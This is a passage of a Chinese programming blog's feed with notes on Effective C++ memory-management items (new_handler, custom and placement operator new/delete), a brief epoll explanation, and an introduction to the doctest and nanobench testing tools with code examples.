new是一个颇为局限的工具，因为它只适用于内存分配阶段；后续的构造函数调用还是可能抛出异常。</li></ul><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">outOfMem</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cerr</span> &lt;&lt; <span class="hljs-string">"Out of memory."</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;<br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">abort</span>();<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-built_in">std</span>::set_new_handler(outOfMem);<br>    <span class="hljs-comment">// 失败返回 0</span><br>    <span class="hljs-keyword">int</span> *noArr = <span class="hljs-keyword">new</span>(<span class="hljs-built_in">std</span>::nothrow) <span class="hljs-keyword">int</span>[<span class="hljs-number">100000000000L</span>];<br>    <span class="hljs-comment">// outOfMem() 触发</span><br>    <span class="hljs-keyword">int</span> *arr = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[<span class="hljs-number">100000000000L</span>];<br>&#125;<br></code></pre></div></td></tr></table></figure><h3><span id="条款50了解new和delete的合理替换时机"><strong>条款50：了解new和delete的合理替换时机</strong></span></h3><p>合理替换时机：</p><ul><li>用来检测运用上的错误。如果我们自行定义一个 operatornew，在申请的内存中写入特定的签名signatures。operator delete检查上述签名是否原封不动，若否就表示在分配的内存区域中发生了 overrun 或underrun，并记录log信息。</li><li>为了强化效能。对某些应用程序而言，将编译器自带的new和delete替换为定制版本，是提升效率的办法之一。</li><li>为了收集使用上的统计数据。</li><li>为了优化内存空间的分配、内存对齐优化等。</li><li>为了将关联数据结构尽量保存在连续的更少的内存页上，减少pagefault。</li></ul><h3><span id="条款51编写new和delete时需固守常规"><strong>条款51：编写new和delete时需固守常规</strong></span></h3><ul><li>operator new应该内含一个无穷循环，并在其中尝试分配内存，如果它无法满足内存需求，就该调用new_handler。它也应该有能力处理0bytes申请。Class专属版本则还应该处理申请内存大小和class大小不匹配的情况，这通常是derived class 没有实现 operator new 而调用了 base class 的 operator new的情况。</li><li>operator delete应该在收到null指针时不做任何事。Class专属版本则还应该处理申请内存大小和class大小不匹配的情况。</li></ul><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Base</span> &#123;</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span>* <span class="hljs-keyword">operator</span> <span class="hljs-title">new</span><span class="hljs-params">(<span class="hljs-built_in">std</span>::<span class="hljs-keyword">size_t</span> <span class="hljs-built_in">size</span>)</span> <span class="hljs-title">throw</span><span class="hljs-params">(<span class="hljs-built_in">std</span>::bad_alloc)</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-keyword">operator</span> <span class="hljs-title">delete</span><span class="hljs-params">(<span class="hljs-keyword">void</span>* rawMem, <span class="hljs-built_in">std</span>::<span class="hljs-keyword">size_t</span> <span class="hljs-built_in">size</span>)</span> <span class="hljs-title">throw</span><span class="hljs-params">()</span></span>;<br>    ...<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span>* Base::<span class="hljs-keyword">operator</span> <span class="hljs-title">new</span><span class="hljs-params">(<span class="hljs-built_in">std</span>::<span class="hljs-keyword">size_t</span> <span class="hljs-built_in">size</span>)</span> <span class="hljs-title">throw</span><span class="hljs-params">(<span class="hljs-built_in">std</span>::bad_alloc)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">size</span> != <span class="hljs-keyword">sizeof</span>(Base))<br>        <span class="hljs-keyword">return</span> ::<span class="hljs-keyword">operator</span> <span class="hljs-keyword">new</span>(<span class="hljs-built_in">size</span>); <span class="hljs-comment">//使用std中标准new</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">size</span> == <span class="hljs-number">0</span>)<br>        <span class="hljs-built_in">size</span> = <span class="hljs-number">1</span>;  <span class="hljs-comment">// 一种处理方法，始终返回合法指针</span><br>    <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) &#123;<br>        分配内存;<br>        <span class="hljs-keyword">if</span> 分配成功<br>            <span class="hljs-keyword">return</span> 指针<br>        <span class="hljs-comment">// 以下只是为了取得 new_handler 函数指针</span><br>        <span class="hljs-built_in">std</span>::new_handler gHandler = <span class="hljs-built_in">std</span>::set_new_handler(<span class="hljs-number">0</span>);<br>        <span class="hljs-built_in">std</span>::set_new_handler(gHandler);<br>        <br>        <span class="hljs-keyword">if</span> (gHandler) (*gHandler)();<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">throw</span> <span class="hljs-built_in">std</span>::bad_alloc();<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> Base::<span class="hljs-keyword">operator</span> <span class="hljs-title">delete</span><span class="hljs-params">(<span class="hljs-keyword">void</span>* rawMem, <span class="hljs-built_in">std</span>::<span class="hljs-keyword">size_t</span> <span class="hljs-built_in">size</span>)</span> <span class="hljs-title">throw</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (rawMem == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">size</span> != <span class="hljs-keyword">sizeof</span>(Base)) &#123;<br>        ::<span class="hljs-function"><span class="hljs-keyword">operator</span> <span class="hljs-title">delete</span><span class="hljs-params">(rawMem)</span></span>;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    回收内存;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3><span id="条款52写了placementnew也要写placement-delete"><strong>条款52：写了placementnew也要写placement delete</strong></span></h3><p>如果operator new接受的参数不止size_t，那就是 placement new。众多placement new版本中特别有用的一个是“接受一个指针指向对象该被构造之处”。</p><p>一个带额外参数的 operatornew，需要<strong>带相同额外参数</strong>的对应版operator delete。</p><p>要防止内存泄漏，必须同时提供一个正常的operatordelete，用于构造期间无任何异常被抛出，和一个 placement delete版本，用于构造期间有异常被抛出。后者的额外参数必须和operatornew一样。</p><ul><li>当你写一个 placement operator new，也需要写对应的 placement operatordelete。如果没有，你的程序可能会发生内存泄漏。</li><li>当你声明 placement new 和placementdelete，考虑是否有必要覆盖它们的正常（全局默认）版本。</li></ul><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">StandardNewDelete</span> &#123;</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-comment">// 使用全局默认的 new/delete</span><br>    <span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span>* <span class="hljs-keyword">operator</span> <span class="hljs-title">new</span><span class="hljs-params">(<span class="hljs-built_in">std</span>::<span class="hljs-keyword">size_t</span> <span class="hljs-built_in">size</span>)</span> <span class="hljs-title">throw</span><span class="hljs-params">(<span class="hljs-built_in">std</span>::bad_alloc)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> ::<span class="hljs-keyword">operator</span> <span class="hljs-keyword">new</span>(<span class="hljs-built_in">size</span>);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-keyword">operator</span> <span class="hljs-title">delete</span><span class="hljs-params">(<span class="hljs-keyword">void</span>* pMem)</span> <span class="hljs-title">throw</span><span class="hljs-params">()</span> </span>&#123;<br>        ::<span class="hljs-function"><span class="hljs-keyword">operator</span> <span class="hljs-title">delete</span><span class="hljs-params">(pMem)</span></span>;<br>    &#125;<br>    <span class="hljs-comment">// 使用全局默认的 placement new/placement delete</span><br>    <span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span>* <span class="hljs-keyword">operator</span> <span class="hljs-title">new</span><span class="hljs-params">(<span class="hljs-built_in">std</span>::<span class="hljs-keyword">size_t</span> <span class="hljs-built_in">size</span>, <span class="hljs-keyword">void</span>* ptr)</span> <span class="hljs-title">throw</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> ::<span class="hljs-keyword">operator</span> <span class="hljs-keyword">new</span>(<span class="hljs-built_in">size</span>, ptr);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-keyword">operator</span> <span class="hljs-title">delete</span><span class="hljs-params">(<span class="hljs-keyword">void</span>* pMem, <span class="hljs-keyword">void</span>* ptr)</span> <span class="hljs-title">throw</span><span class="hljs-params">()</span> </span>&#123;<br>        ::<span class="hljs-function"><span class="hljs-keyword">operator</span> <span class="hljs-title">delete</span><span class="hljs-params">(pMem, ptr)</span></span>;<br>    &#125;<br>    <span class="hljs-comment">// 使用全局默认的 nothrow new/nothrow delete</span><br>    <span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span>* <span class="hljs-keyword">operator</span> <span class="hljs-title">new</span><span class="hljs-params">(<span class="hljs-built_in">std</span>::<span class="hljs-keyword">size_t</span> <span class="hljs-built_in">size</span>, <span class="hljs-keyword">const</span> <span class="hljs-built_in">std</span>::<span class="hljs-keyword">nothrow_t</span>&amp; nt)</span> <span class="hljs-title">throw</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> ::<span class="hljs-keyword">operator</span> <span class="hljs-keyword">new</span>(<span class="hljs-built_in">size</span>, nt);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-keyword">operator</span> <span class="hljs-title">delete</span><span class="hljs-params">(<span class="hljs-keyword">void</span>* pMem, <span class="hljs-keyword">const</span> <span class="hljs-built_in">std</span>::<span class="hljs-keyword">nothrow_t</span>&amp; nt)</span> <span class="hljs-title">throw</span><span class="hljs-params">()</span> </span>&#123;<br>        ::<span class="hljs-function"><span class="hljs-keyword">operator</span> <span class="hljs-title">delete</span><span class="hljs-params">(pMem)</span></span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 增加自定义形式</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Derived</span>:</span> <span class="hljs-keyword">public</span> StandardNewDelete &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-comment">// 防止标准  new/delete 被覆盖</span><br>    <span class="hljs-keyword">using</span> StandardNewDelete::<span class="hljs-keyword">operator</span> <span class="hljs-keyword">new</span>;<br>    <span class="hljs-keyword">using</span> StandardNewDelete::<span class="hljs-keyword">operator</span> <span class="hljs-keyword">delete</span>;<br>    <span class="hljs-comment">// 追加自定义 placement new/placement delete</span><br>    <span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span>* <span class="hljs-keyword">operator</span> <span class="hljs-title">new</span><span class="hljs-params">(<span class="hljs-built_in">std</span>::<span class="hljs-keyword">size_t</span> <span class="hljs-built_in">size</span>, <span class="hljs-built_in">std</span>::ostream&amp; logStream)</span> <span class="hljs-title">throw</span><span class="hljs-params">(<span class="hljs-built_in">std</span>::bad_alloc)</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-keyword">operator</span> <span class="hljs-title">delete</span><span class="hljs-params">(<span class="hljs-keyword">void</span>* pMem, <span class="hljs-built_in">std</span>::ostream&amp; logStream)</span> <span class="hljs-title">throw</span><span class="hljs-params">()</span></span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2><span id="九-杂项讨论">九、杂项讨论</span></h2><h3><span id="条款53不要轻忽编译器的警告"><strong>条款53：不要轻忽编译器的警告</strong></span></h3><ul><li>严肃对待编译器发出的警告信息。努力在编译器的最高警告级别下争取“无任何警告”。</li><li>不同的编译器处理方式并不相同。</li></ul><h3><span id="条款54让自己熟悉标准程序库"><strong>条款54：让自己熟悉标准程序库</strong></span></h3><ul><li>C++标准程序库的主要功能由STL、iostreams、locales组成。</li><li>熟悉智能指针、函数指针、hash-based容器、正则表达式（regularexpressions）等。</li></ul><h3><span id="条款55让自己熟悉boost"><strong>条款55：让自己熟悉Boost</strong></span></h3><ul><li>Boost致力于免费、源码开放、同僚复审的C++程序库开发。Boost在C++标准化过程中扮演深具影响力的角色。</li></ul>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
          <category> C++ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
            <tag> Book </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>epoll简述</title>
      <link href="/posts/d207ef0b.html"/>
      <url>/posts/d207ef0b.html</url>
      
        <content type="html"><![CDATA[<p>epoll实现机制粗糙版总结。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/img/Desktop/2022/03/28/00-10-57-82955f.png" srcset="/img/loading.gif" lazyload></p><p>Level-triggered VS Edge-triggered两种模式在实现中的不同之处在于：</p><p>在 ep_send_events_proc函数（ep_send_events中的一个回调函数）的中，如果是 level-triggered模式，当前的 epoll_item 对象被重新加到 eventpoll 的就绪列表 ready list中，这样在下一次 epoll_wait 调用时，这些 epoll_item对象就会被重新处理。而 edge-triggered 模式，不会重新加入。</p><p>另外，引用一篇优质blog <a href="https://blog.csdn.net/XueyinGuo/article/details/113096163">select、poll、epoll-IO模型超详解</a>。基础概念和基础使用等的信息，直接搜索，不再重复写这里了。</p><p>在上面引用的blog中，有一张关于 epoll机制更抽象一点的图，放一起方便对比。<strong>但是该作者有一处错误，关于mmap说明</strong>。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/img/Desktop/2022/03/28/00-16-13-991cff.png" srcset="/img/loading.gif" lazyload></p><p>这里对 mmap得说明是错误的。<strong>并不是</strong>只有块设备才可以进行 mmap内存映射。</p><p>所以上图中的解释是错误的。按我的认知来讲，这里没有将事件链表进行内存映射，至少不是设备类型的原因。</p><p>rdlist 链表中的事件是会被复制到用户空间的。</p>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
          <category> Computer Network </category>
          
      </categories>
      
      
        <tags>
            
            <tag> epoll </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C/C++测试框架</title>
      <link href="/posts/aeaec6fb.html"/>
      <url>/posts/aeaec6fb.html</url>
      
        <content type="html"><![CDATA[<h2><span id="框架">框架</span></h2><p>Head only</p><ul><li><a href="https://github.com/catchorg/Catch2" target="_blank" rel="noopener">catch2</a></li><li><a href="https://github.com/doctest/doctest" target="_blank" rel="noopener">doctest</a></li></ul><p>Compile</p><ul><li><a href="https://github.com/google/googletest" target="_blank" rel="noopener">googletest</a></li></ul><p>C 测试框架：</p><ul><li><a href="https://cmocka.org/" target="_blank" rel="noopener">cmocka</a></li></ul><h2><span id="doctest">doctest</span></h2><ul><li>轻量</li><li>编译速度快（相比于 catch2）</li><li>API友好</li><li>功能丰富，支持对模板批量测试</li></ul><p>使用 CMake 配置时，确保编译的目标文件找得到 doctest的头文件即可。</p><figure class="highlight cmake"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cmake"><span class="hljs-keyword">include_directories</span>('path to doctest.h')<br><br><span class="hljs-comment"># 或者</span><br><span class="hljs-keyword">target_include_directories</span>(<span class="hljs-variable">$&#123;target_name&#125;</span> PUBLIC 'path to doctest.h')<br></code></pre></div></td></tr></table></figure><p>断言宏等级划分：</p><ul><li>REQUIRE：这个等级算是最高的，如果断言失败，不仅会标记为测试不通过，而且会强制退出测试。</li><li>CHECK：如果断言失败，标记为测试不通过，但不会强制退出，会继续执行。</li><li>WARN：如果断言失败，不会标记为测试不通过，也不会强制退出，但是会给出对应的提示。</li></ul><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">// build test subcases like a tree.</span><br><span class="hljs-comment">// run: 1--2--end   1--3--end  two subroutines.</span><br>TEST_CASE(<span class="hljs-string">"vectors can be sized and resized"</span>) &#123;<br>  <span class="hljs-function"><span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; <span class="hljs-title">v</span><span class="hljs-params">(<span class="hljs-number">5</span>)</span></span>;<br>  <span class="hljs-comment">// 1</span><br>  REQUIRE(v.<span class="hljs-built_in">size</span>() == <span class="hljs-number">5</span>);<br>  REQUIRE(v.capacity() &gt;= <span class="hljs-number">5</span>);<br><br>  SUBCASE(<span class="hljs-string">"adding to the vector increases it's size"</span>) &#123;<br>    <span class="hljs-comment">// 2</span><br>    v.push_back(<span class="hljs-number">1</span>);<br><br>    CHECK(v.<span class="hljs-built_in">size</span>() == <span class="hljs-number">6</span>);<br>    CHECK(v.capacity() &gt;= <span class="hljs-number">6</span>);<br>  &#125;<br>  SUBCASE(<span class="hljs-string">"reserving increases just the capacity"</span>) &#123;<br>    <span class="hljs-comment">// 3</span><br>    v.reserve(<span class="hljs-number">6</span>);<br><br>    CHECK(v.<span class="hljs-built_in">size</span>() == <span class="hljs-number">5</span>);<br>    CHECK(v.capacity() &gt;= <span class="hljs-number">6</span>);<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// Group the test cases.</span><br>TEST_SUITE(<span class="hljs-string">"math"</span>) &#123;<br>  TEST_CASE(<span class="hljs-string">""</span>) &#123;&#125; <span class="hljs-comment">// part of the math test suite</span><br>  TEST_CASE(<span class="hljs-string">""</span>) &#123;&#125; <span class="hljs-comment">// part of the math test suite</span><br>&#125;<br><br><span class="hljs-comment">// Test template.</span><br>TEST_CASE_TEMPLATE(<span class="hljs-string">"test std::any as integer"</span>, T, <span class="hljs-keyword">char</span>, short, <span class="hljs-keyword">int</span>,<br>                   <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">int</span>) &#123;<br>  <span class="hljs-keyword">auto</span> v = T();<br>  <span class="hljs-built_in">std</span>::any var = T();<br>  CHECK(<span class="hljs-built_in">std</span>::any_cast&lt;T&gt;(var) == v);<br>&#125;<br><br>TEST_CASE_TEMPLATE(<span class="hljs-string">"test std::any as string"</span>, T, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *, <span class="hljs-built_in">std</span>::string_view,<br>                   <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>) &#123;<br>  T v = <span class="hljs-string">"hello world"</span>;<br>  <span class="hljs-built_in">std</span>::any var = v;<br>  CHECK(<span class="hljs-built_in">std</span>::any_cast&lt;T&gt;(var) == v);<br>&#125;<br><br><br>TEST_CASE(<span class="hljs-string">"infos"</span>) &#123;<br>  REQUIRE(<span class="hljs-string">"foobar"</span> == doctest::Contains(<span class="hljs-string">"foo"</span>));<br>  CHECK_MESSAGE(<span class="hljs-number">2</span> == <span class="hljs-number">1</span>, <span class="hljs-string">"not valid"</span>);<br>  REQUIRE(<span class="hljs-number">22.0</span> / <span class="hljs-number">7</span> ==<br>          doctest::Approx(<span class="hljs-number">3.141</span>).epsilon(<span class="hljs-number">0.01</span>)); <span class="hljs-comment">// allow for a 1% error</span><br>&#125;<br></code></pre></div></td></tr></table></figure><h2><span id="nanobench">nanobench</span></h2><p><a href="https://nanobench.ankerl.com/tutorial.html">nanobench</a></p><figure class="highlight cmake"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cmake"><span class="hljs-keyword">include</span>(FetchContent)<br><br>FetchContent_Declare(<br>    nanobench<br>    GIT_REPOSITORY https://github.com/martinus/nanobench.git<br>    GIT_TAG v4.<span class="hljs-number">1.0</span><br>    GIT_SHALLOW <span class="hljs-keyword">TRUE</span>)<br><br>FetchContent_MakeAvailable(nanobench)<br><br><br>...<br><br><br><span class="hljs-comment"># 目标文件链接</span><br><span class="hljs-keyword">target_link_libraries</span>(<span class="hljs-variable">$&#123;target_name&#125;</span> PRIVATE nanobench)<br></code></pre></div></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;nanobench.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;atomic&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> y = <span class="hljs-number">0</span>;<br>    <span class="hljs-function"><span class="hljs-built_in">std</span>::atomic&lt;<span class="hljs-keyword">int</span>&gt; <span class="hljs-title">x</span><span class="hljs-params">(<span class="hljs-number">0</span>)</span></span>;<br>    ankerl::nanobench::Bench().<span class="hljs-built_in">run</span>(<span class="hljs-string">"compare_exchange_strong"</span>, [&amp;] &#123;<br>        x.compare_exchange_strong(y, <span class="hljs-number">0</span>);<br>    &#125;);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>输出结果</p><table><thead><tr class="header"><th style="text-align: right;">ns/op</th><th style="text-align: right;">op/s</th><th style="text-align: right;">err%</th><th style="text-align: right;">total</th><th style="text-align: left;">benchmark</th></tr></thead><tbody><tr class="odd"><td style="text-align: right;">9.07</td><td style="text-align: right;">110,254,890.34</td><td style="text-align: right;">0.0%</td><td style="text-align: right;">0.00</td><td style="text-align: left;"><code>compare_exchange_strong</code></td></tr></tbody></table><blockquote><ul><li>ns/op：每个bench内容需要经历的时间（ns为单位）</li><li>op/s：每秒可以执行多少次操作</li><li>err%：运行多次测试的波动情况（误差）</li><li>ins/op：每次操作需要多少条指令</li><li>cyc/op：每次操作需要多少次时钟周期</li><li>bra/op：每次操作有多少次分支预判</li><li>miss%：分支预判的miss率</li><li>total：本次消耗的总时间</li><li>benchmark："compare_exchange_strong" 自定义测试名称</li></ul></blockquote><p>可测 BigO 时间复杂度：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DOCTEST_CONFIG_IMPLEMENT_WITH_MAIN</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;doctest.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;nanobench.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;atomic&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;set&gt;</span></span><br><br>TEST_CASE(<span class="hljs-string">"tutorial_complexity_set_find"</span>) &#123;<br>  <span class="hljs-comment">// Create a single benchmark instance that is used in multiple benchmark</span><br>  <span class="hljs-comment">// runs, with different settings for complexityN.</span><br>  ankerl::nanobench::Bench bench;<br><br>  <span class="hljs-comment">// a RNG to generate input data</span><br>  ankerl::nanobench::Rng rng;<br><br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">set</span>&lt;<span class="hljs-keyword">uint64_t</span>&gt; <span class="hljs-built_in">set</span>;<br><br>  <span class="hljs-comment">// Running the benchmark multiple times, with different number of elements</span><br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> setSize :<br>       &#123;<span class="hljs-number">10U</span>, <span class="hljs-number">20U</span>, <span class="hljs-number">50U</span>, <span class="hljs-number">100U</span>, <span class="hljs-number">200U</span>, <span class="hljs-number">500U</span>, <span class="hljs-number">1000U</span>, <span class="hljs-number">2000U</span>, <span class="hljs-number">5000U</span>, <span class="hljs-number">10000U</span>&#125;) &#123;<br><br>    <span class="hljs-comment">// fill up the set with random data</span><br>    <span class="hljs-keyword">while</span> (<span class="hljs-built_in">set</span>.<span class="hljs-built_in">size</span>() &lt; setSize) &#123;<br>      <span class="hljs-built_in">set</span>.insert(rng());<br>    &#125;<br><br>    <span class="hljs-comment">// Run the benchmark, provide setSize as the scaling variable.</span><br>    bench.complexityN(<span class="hljs-built_in">set</span>.<span class="hljs-built_in">size</span>()).<span class="hljs-built_in">run</span>(<span class="hljs-string">"std::set find"</span>, [&amp;] &#123;<br>      ankerl::nanobench::doNotOptimizeAway(<span class="hljs-built_in">set</span>.<span class="hljs-built_in">find</span>(rng()));<br>    &#125;);<br>  &#125;<br><br>  <span class="hljs-comment">// calculate BigO complexy best fit and print the results</span><br>  <span class="hljs-built_in">std</span>::<span 